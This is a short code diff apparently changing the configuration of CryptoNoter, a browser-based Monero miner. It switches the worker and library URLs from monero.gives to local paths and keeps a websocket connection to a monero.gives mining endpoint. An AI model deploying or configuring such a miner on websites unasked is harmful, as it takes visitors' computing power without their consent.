@@ -66,7 +66,7 @@
                 this._asmjsStatus = "loaded";
                 this._startNow()
             }.bind(this), xhr);
-            xhr.open("get", "https://monero.gives/assets/lib/zeriam-worker.js", true);
+            xhr.open("get", "/assets/lib/zeriam-worker.js", true);
             xhr.send()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
@@ -489,6 +489,6 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://monero.gives/assets/lib/",
+    LIB_URL: "/assets/lib/",
     WEBSOCKET_SHARDS: [["wss://monero.gives/zeriam"]]
 };
